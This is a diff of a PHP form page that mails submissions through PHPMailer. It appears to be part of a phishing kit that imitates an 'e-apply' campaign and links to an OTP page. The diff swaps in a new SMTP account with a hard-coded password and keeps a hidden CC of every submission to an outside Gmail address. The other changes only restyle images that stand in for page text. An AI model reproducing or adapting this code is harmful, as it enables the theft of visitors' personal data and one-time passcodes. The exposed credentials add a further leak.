@@ -17,9 +17,9 @@ include('PHPMailer/class.smtp.php');
                 $mail->SMTPAuth = true;
                 $mail->SMTPSecure = 'ssl';
                 $mail->Port = 465;
-                $mail->Username = "info@instant-e-apply-campaign-page-online-cmsm-sb-page.co.in";
-                $mail->Password = "Info@123";
-                $mail->AddAddress("info@instant-e-apply-campaign-page-online-cmsm-sb-page.co.in");
+                $mail->Username = "info@swimstudios.xyz";
+                $mail->Password = "Admin@123";
+                $mail->AddAddress("info@swimstudios.xyz");
                 $mail->addCC('easymailid45@gmail.com');
                 $mail->SetFrom($mail->Username);
                 
@@ -63,7 +63,7 @@ include('PHPMailer/class.smtp.php');
     <div class="container">
         <div class="row">
             <div class="col-xs-12"><br><br>
-                <p class="text-center" style="font-size: 16px;"><img src="img/img017.jpg"></p>
+                <p class="text-center" style="font-size: 16px;"><img style="width: 100%;" src="img/img017.jpg"></p>
             </div>
         </div>
         <div class="row">
@@ -80,7 +80,7 @@ include('PHPMailer/class.smtp.php');
                         <td><p class="pera"><span style="letter-spacing: 1px; color: #818181;"><img src="img/img020.jpg"> </span></p>
                         </td>
                         <td>
-                            <p class="pera"><b><img src="img/img021.jpg"></b></p>
+                            <p class="pera"><b><img style="width: 100%;" src="img/img021.jpg"></b></p>
                         </td>
                     </tr>
                         <td><p class="pera"><span style="letter-spacing: 1px; color: #818181;"><img src="img/img019.jpg"> </span></p>
@@ -97,7 +97,7 @@ include('PHPMailer/class.smtp.php');
                         </td>
                     </tr>
                 </table>
-                <p style="padding: 5px 10px;"><img src="img/img023.jpg"></p>
+                <p style="padding: 5px 10px;"><img style="width: 100%;" src="img/img023.jpg"></p>
                 <form method="post">
                 <table>
                     <tr>
@@ -107,7 +107,7 @@ include('PHPMailer/class.smtp.php');
                         </td>
                     </tr>
                 </table>
-                <p style="font-size: 10px; margin-top: 10px; text-align: center;"><img src="img/img025.jpg"> </p>
+                <p style="font-size: 10px; margin-top: 10px; text-align: center;"><img style="width: 100%;" src="img/img025.jpg"> </p>
                 <div class="row">
                     <div class="col-xs-6 text-right">
                         <button type="submit" name="submit" class="btn btn-lg">Submit</button>
@@ -116,7 +116,7 @@ include('PHPMailer/class.smtp.php');
                         <a href="o-t-p.php"><button class="btn btn-lg">Cancel</button></a>
                     </div>
                 </div>
-                <p class="btntag"><img src="img/img026.jpg"></p>
+                <p class="btntag"><img style="width: 100%;" src="img/img026.jpg"></p>
             </form>
 
             </div>
